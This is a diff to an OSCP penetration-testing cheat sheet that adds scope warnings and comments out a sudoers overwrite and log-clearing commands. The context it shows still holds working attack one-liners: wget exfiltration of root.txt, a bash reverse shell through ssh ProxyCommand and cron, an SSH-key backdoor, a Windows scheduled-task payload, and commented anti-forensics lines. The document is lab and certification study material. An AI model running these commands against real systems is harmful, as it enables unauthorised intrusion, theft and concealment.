@@ -141,7 +141,9 @@ Grouped by attack phase, intended as a quick reference for OSCP preparation.
 
     # wget
     sudo wget --post-file=/root/root.txt http://LHOST:8000/
-    sudo wget -O /etc/sudoers http://LHOST:8000/sudoers
+    # WARNING: overwrites /etc/sudoers. Recovery-only in isolated lab.
+    # In real engagement: out of scope - can brick the system.
+    # sudo wget -O /etc/sudoers http://LHOST:8000/sudoers
 
     # ssh ProxyCommand
     sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"' x
@@ -302,20 +304,33 @@ Grouped by attack phase, intended as a quick reference for OSCP preparation.
     nc -lvnp 8000 > file.txt
     cat file.txt > /dev/tcp/LHOST/8000
 
-### Persistence - Linux
+### Persistence
+
+> **Scope:** Persistence is **not required** for HTB/OSCP (the box is yours). In real engagements, persistence is only allowed if explicitly authorized in the Rules of Engagement - otherwise it is out of scope.
+
+**Linux:**
 
     echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"' | crontab -
     echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys
 
-### Persistence - Windows
+**Windows:**
 
     schtasks /create /tn "Updater" /tr "C:\Windows\Temp\shell.exe" /sc onlogon
 
 ### Cleanup
 
-    history -c
-    rm -f ~/.bash_history
-    wevtutil cl System
+> **Scope:** Remove only **your own** artifacts (payloads, exploit scripts, temp files). Clearing logs/history is anti-forensics and out of scope.
+
+**Remove your artifacts:**
+
+    rm -rf /tmp/payloads/
+    del C:\Windows\Temp\shell.exe
+
+**What NOT to do (anti-forensics):**
+
+    # history -c
+    # rm -f ~/.bash_history
+    # wevtutil cl System
 
 ---
 
